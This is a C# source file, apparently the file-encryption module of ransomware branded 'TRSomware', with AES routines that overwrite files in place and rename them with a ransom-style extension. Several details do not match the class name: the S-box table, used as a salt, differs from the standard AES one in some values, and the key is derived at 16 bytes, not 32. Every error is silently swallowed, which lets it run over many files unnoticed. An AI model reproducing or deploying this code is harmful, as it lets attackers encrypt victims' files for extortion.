using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

internal class AES256
{
	public static byte[] SBOX = new byte[256]
	{
		99, 124, 119, 123, 242, 107, 111, 197, 48, 1,
		103, 43, 254, 215, 171, 118, 202, 130, 201, 125,
		250, 89, 71, 240, 173, 212, 162, 175, 156, 164,
		114, 192, 183, 253, 147, 38, 54, 63, 247, 204,
		52, 165, 229, 241, 113, 216, 49, 21, 4, 199,
		35, 195, 24, 150, 5, 154, 7, 18, 128, 226,
		235, 39, 178, 117, 9, 131, 44, 26, 27, 110,
		90, 160, 82, 59, 214, 179, 41, 227, 47, 132,
		83, 209, 0, 237, 32, 252, 177, 91, 106, 203,
		190, 57, 74, 76, 88, 207, 208, 239, 170, 251,
		67, 212, 51, 133, 69, 249, 2, 127, 80, 60,
		159, 168, 81, 163, 64, 248, 146, 217, 56, 245,
		188, 182, 218, 33, 16, 255, 243, 210, 205, 12,
		19, 236, 95, 151, 68, 23, 196, 167, 126, 61,
		100, 93, 25, 115, 96, 129, 79, 220, 34, 42,
		144, 136, 70, 238, 184, 20, 222, 94, 11, 219,
		224, 50, 58, 10, 73, 6, 36, 92, 194, 211,
		172, 98, 145, 149, 228, 121, 231, 200, 55, 109,
		141, 213, 78, 169, 108, 86, 244, 234, 100, 122,
		174, 8, 186, 120, 37, 46, 28, 166, 180, 198,
		232, 221, 116, 31, 75, 189, 139, 138, 112, 62,
		181, 102, 72, 3, 246, 14, 97, 53, 87, 185,
		134, 193, 29, 158, 225, 248, 152, 17, 105, 217,
		142, 148, 155, 30, 135, 233, 206, 85, 40, 223,
		140, 161, 137, 13, 191, 230, 66, 104, 65, 153,
		45, 15, 176, 84, 187, 22
	};

	public static readonly string EXTENSION = ".TRSomware[is_back__New-Algorithm__By_MaMo434376]";

	public static byte[] AES256_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] result = null;
		try
		{
			using MemoryStream memoryStream = new MemoryStream();
			using AesManaged aesManaged = new AesManaged();
			aesManaged.KeySize = 256;
			aesManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, SBOX, 1000);
			aesManaged.Key = rfc2898DeriveBytes.GetBytes(aesManaged.KeySize / 16);
			aesManaged.IV = rfc2898DeriveBytes.GetBytes(aesManaged.BlockSize / 8);
			aesManaged.Mode = CipherMode.CBC;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aesManaged.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		catch (ArgumentException)
		{
		}
		catch (CryptographicException)
		{
		}
		catch (UnauthorizedAccessException)
		{
		}
		catch (IOException)
		{
		}
		catch (FormatException)
		{
		}
		catch (Exception)
		{
		}
		return result;
	}

	public static byte[] AES256_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
	{
		byte[] result = null;
		try
		{
			using MemoryStream memoryStream = new MemoryStream();
			using AesManaged aesManaged = new AesManaged();
			aesManaged.KeySize = 256;
			aesManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, SBOX, 1000);
			aesManaged.Key = rfc2898DeriveBytes.GetBytes(aesManaged.KeySize / 16);
			aesManaged.IV = rfc2898DeriveBytes.GetBytes(aesManaged.BlockSize / 8);
			aesManaged.Mode = CipherMode.CBC;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aesManaged.CreateDecryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		catch (ArgumentException)
		{
		}
		catch (CryptographicException)
		{
		}
		catch (UnauthorizedAccessException)
		{
		}
		catch (IOException)
		{
		}
		catch (FormatException)
		{
		}
		catch (Exception)
		{
		}
		return result;
	}

	public static void EncryptText(string input, string password)
	{
		try
		{
			byte[] bytes = Encoding.UTF8.GetBytes(input);
			byte[] bytes2 = Encoding.UTF8.GetBytes(password);
			bytes2 = SHA512.Create().ComputeHash(bytes2);
			Convert.ToBase64String(AES256_Encrypt(bytes, bytes2));
		}
		catch (ArgumentException)
		{
		}
		catch (CryptographicException)
		{
		}
		catch (UnauthorizedAccessException)
		{
		}
		catch (IOException)
		{
		}
		catch (FormatException)
		{
		}
	}

	public static void DecryptText(string input, string password)
	{
		try
		{
			byte[] bytesToBeDecrypted = Convert.FromBase64String(input);
			byte[] bytes = Encoding.UTF8.GetBytes(password);
			bytes = SHA512.Create().ComputeHash(bytes);
			byte[] bytes2 = AES256_Decrypt(bytesToBeDecrypted, bytes);
			Encoding.UTF8.GetString(bytes2);
		}
		catch (ArgumentException)
		{
		}
		catch (CryptographicException)
		{
		}
		catch (UnauthorizedAccessException)
		{
		}
		catch (IOException)
		{
		}
		catch (FormatException)
		{
		}
	}

	public static void EncryptFile(string file, string password)
	{
		try
		{
			if (new FileInfo(file).Length <= 300000000)
			{
				byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
				byte[] bytes = Encoding.UTF8.GetBytes(password);
				bytes = SHA512.Create().ComputeHash(bytes);
				byte[] bytes2 = AES256_Encrypt(bytesToBeEncrypted, bytes);
				File.WriteAllBytes(file, bytes2);
				File.Move(file, file + EXTENSION);
			}
		}
		catch (ArgumentException)
		{
		}
		catch (CryptographicException)
		{
		}
		catch (UnauthorizedAccessException)
		{
		}
		catch (IOException)
		{
		}
		catch (FormatException)
		{
		}
	}

	public static void DecryptFile(string file, string password)
	{
		try
		{
			if (new FileInfo(file).Length <= 300000000)
			{
				byte[] bytesToBeDecrypted = File.ReadAllBytes(file);
				byte[] bytes = Encoding.UTF8.GetBytes(password);
				bytes = SHA512.Create().ComputeHash(bytes);
				byte[] bytes2 = AES256_Decrypt(bytesToBeDecrypted, bytes);
				File.WriteAllBytes(file, bytes2);
				string extension = Path.GetExtension(file);
				string destFileName = file.Substring(0, file.Length - extension.Length);
				File.Move(file, destFileName);
			}
		}
		catch (ArgumentException)
		{
		}
		catch (CryptographicException)
		{
		}
		catch (UnauthorizedAccessException)
		{
		}
		catch (IOException)
		{
		}
		catch (FormatException)
		{
		}
	}
}
